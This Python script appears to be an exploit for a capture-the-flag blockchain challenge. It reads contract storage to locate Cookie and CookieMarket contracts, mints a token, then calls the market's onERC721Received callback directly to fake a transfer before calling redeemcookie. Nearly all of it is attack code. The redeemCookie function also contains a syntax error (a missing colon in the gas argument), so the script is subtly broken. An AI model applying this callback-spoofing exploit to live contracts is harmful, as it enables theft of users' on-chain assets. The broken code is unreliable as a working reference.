import pprint
import time

from web3 import Web3
from solcx import install_solc, compile_files
from eth_account import Account
from pwn import *

uuid = 'xxx'
rpc = 'xxx'
privateKey = 'xxx'
setupContract = 'xxx'
web3 = Web3(Web3.HTTPProvider(rpc))

account = Account.from_key(privateKey)
print('Account address:', account.address)
print('Account Balance', web3.eth.get_balance(account.address))

for account in web3.eth.accounts:
    print('web3.eth.accounts: ', account, web3.eth.get_balance(account))

print('The address is')
cookieAddress = Web3.toChecksumAddress('0x' + web3.eth.get_storage_at(setupContract, 0).hex()[2:].lstrip('0'))
cookieMarketAddress = Web3.toChecksumAddress('0x' + web3.eth.get_storage_at(setupContract, 1).hex()[2:].lstrip('0'))

print('cookieAddress', cookieAddress)
print('cookieMarketAddress', cookieMarketAddress)

# Compile SOL
compiled_sol = compile_files(['CookieMarket.sol', 'cookie.sol'], output_values=['abi', 'bin'])
cookieMarketContract = compiled_sol['CookieMarket.sol:CookieMarket']
cookieContract = compiled_sol['cookie.sol:Cookie']

# Remote Contract
CookieMarket = web3.eth.contract(address=cookieMarketAddress, abi=cookieMarketContract['abi'])
Cookie = web3.eth.contract(address=cookieAddress, abi=cookieContract['abi'])

print('cookieMarket Transaction Count:', web3.eth.get_transaction_count(cookieMarketAddress))
print('Cookie Transaction Count:', web3.eth.get_transaction_count(cookieAddress))

for i in range(10):
    print('cookieAddress', i, web3.eth.get_storage_at(cookieAddress, i).hex())

for i in range(10):
    print('cookieMarketAddress', i, web3.eth.get_storage_at(cookieMarketAddress, i).hex())

print('Current Cookie.IDX', Cookie.functions.cookieIDX().call())
print('Current Cookie.owner', Cookie.functions.owner().call())

print('let\'s mint a cookie')
tx_hash = Cookie.functions.mintcookie().transact({'from': web3.eth.accounts[1], 'gas': 100000})
receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
pprint.pprint(receipt)


def canRedeemCookie():
    tx_hash = CookieMarket.functions.onERC721Received(web3.eth.accounts[1], web3.eth.accounts[1], 0, '').transact({'from': web3.eth.accounts[1], 'gas': 100000})
    receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
canRedeemCookie()

def redeemCookie():
    tx_hash = CookieMarket.functions.redeemcookie(0).transact({'from': web3.eth.accounts[1], 'gas' 100000})
    receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    pprint.pprint(receipt)
redeemCookie()
